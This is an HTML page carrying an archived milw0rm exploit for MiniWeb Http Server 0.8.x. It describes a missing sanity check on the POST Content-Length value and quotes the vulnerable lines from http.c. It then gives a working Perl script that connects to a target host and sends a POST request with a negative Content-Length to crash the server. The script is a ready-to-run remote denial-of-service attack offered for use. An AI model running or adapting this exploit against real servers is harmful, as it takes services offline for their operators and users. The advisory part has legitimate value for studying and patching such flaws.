<html><head><title>MiniWeb Http Server 0.8.x Remote Denial of Service Exploit</title></head><pre># MiniWeb Http Server 0.8.x Remote Denial of Service
# MiniWeb site http://sourceforge.net/projects/miniweb/
# Author: gbr
#
# Tested running the server under Windows XP SP2
#
# Description:
#
# The server doesn't do a sanity-check on 'Content-Length' value from POST Header, allowing the attacker to control
# the allocation size and the position in the 'pucPayload' char pointer to write.
# This could be used to trigger an exception.
#
#
# Vulnerable code - file http.c | lines 701-702 MiniWeb 0.8.1 | lines 704 - 705 MiniWeb 0.8.19
# ------------------------------------------
# phsSocket-&gt;request.pucPayload=malloc(phsSocket-&gt;response.iContentLength+1);
# phsSocket-&gt;request.pucPayload[phsSocket-&gt;response.iContentLength]=0;
# ------------------------------------------

#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;

my $host = shift || die &quot;usage: perl $0 host [port]\n&quot;;
my $port = shift || 80;

my $sock = new IO::Socket::INET(PeerAddr =&gt; $host, PeerPort =&gt; $port, PeerProto =&gt; 'tcp')
or die &quot;error: $!\n&quot;;

$sock-&gt;send(&quot;POST / HTTP/1.1\r\n&quot;);
$sock-&gt;send(&quot;Content-Length: -10\r\n\r\n&quot;);

$sock-&gt;close;

print &quot;Exploited\n&quot;;

# milw0rm.com [2007-06-07]</pre></html>